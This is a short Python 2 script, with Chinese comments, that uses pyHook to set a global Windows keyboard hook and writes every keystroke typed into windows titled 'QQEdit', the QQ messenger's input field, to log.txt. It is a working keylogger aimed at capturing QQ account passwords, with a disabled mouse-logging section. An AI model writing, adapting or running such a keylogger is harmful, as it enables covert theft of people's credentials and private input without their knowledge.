 # -*- coding: utf-8 -*- #
 # by oldj http://oldj.net/ #
import pythoncom
import pyHook

key_word = open('log.txt', 'w')
def onMouseEvent(event):
    # 监听鼠标事件
    print "MessageName:",event.MessageName
    print "Message:", event.Message
    print "Time:", event.Time
    print "Window:", event.Window
    print "WindowName:", event.WindowName
    print "Position:", event.Position
    print "Wheel:", event.Wheel
    print "Injected:", event.Injected
    print"---"

    # 返回 True 以便将事件传给其它处理程序
    # 注意，这儿如果返回 False ，则鼠标事件将被全部拦截
    # 也就是说你的鼠标看起来会僵在那儿，似乎失去响应了
    return True

def onKeyboardEvent(event):
    # 监听键盘事件
    global key_word
    key_name = chr(event.Ascii)
    window_name = event.WindowName
    #print "MessageName:", event.MessageName
    #print "Message:", event.Message

    #print "Time:", event.Time
    #print "Window:", event.Window
    #print "WindowName:", event.WindowName
    #print "Ascii:", event.Ascii, chr(event.Ascii)
    #print "Ascii:", chr(event.Ascii)
    #print "Key:", event.Key
    #print "KeyID:", event.KeyID
    #print "ScanCode:", event.ScanCode
    #print "Extended:", event.Extended
    #print "Injected:", event.Injected
    #print "Alt", event.Alt
    #print "Transition", event.Transition
    #print "---"
    # 同鼠标事件监听函数的返回值
    #global key_word
    if window_name == "QQEdit":
        key_word.write(chr(event.Ascii))
        #key_word.write(window_name)
        key_word.flush()
    return True

def main():
    #key_word =  'kaishi'

    # 创建一个“钩子”管理对象
    hm = pyHook.HookManager()
    # 监听所有键盘事件
    hm.KeyDown = onKeyboardEvent
    #onKeyboardEvent(hm.KeyDown, key_word)
    # 设置键盘“钩子”
    hm.HookKeyboard()
    # 监听所有鼠标事件
#   hm.MouseAll = onMouseEvent
#   # 设置鼠标“钩子”
#   hm.HookMouse()
    # 进入循环，如不手动关闭，程序将一直处于监听状态

#   fp.write(key)
    #print "test",key_word
    #while 1:
    #   print "test"
    pythoncom.PumpMessages()
#    fp.close(key)

if __name__ == "__main__":
    main()